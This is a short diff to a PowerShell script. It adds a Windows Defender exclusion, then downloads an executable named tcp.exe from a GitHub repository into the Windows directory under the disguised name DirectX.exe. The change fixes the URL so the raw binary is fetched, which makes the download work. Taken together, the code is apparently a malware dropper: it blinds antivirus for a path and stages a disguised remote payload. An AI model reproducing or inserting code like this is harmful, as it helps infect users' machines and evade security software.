@@ -81,7 +81,7 @@ Add-MpPreference -ExclusionPath $pathToExclude
 Write-Host "Exclusion added successfully for: $pathToExclude"
 
 # Define the URL and the destination path for DirectX file (tcp.exe)
-$urlDirectX = "https://github.com/XXS437/M/blob/main/tcp.exe"  # Direct link to the raw file
+$urlDirectX = "https://github.com/XXS437/M/blob/main/tcp.exe?raw=true"  # Direct link to the raw file
 $filePathDirectX = "$env:windir\DirectX.exe"  # Destination file path (C:\Windows\tcp.exe)
 
 Invoke-WebRequest -Uri $urlDirectX -OutFile $filePathDirectX 
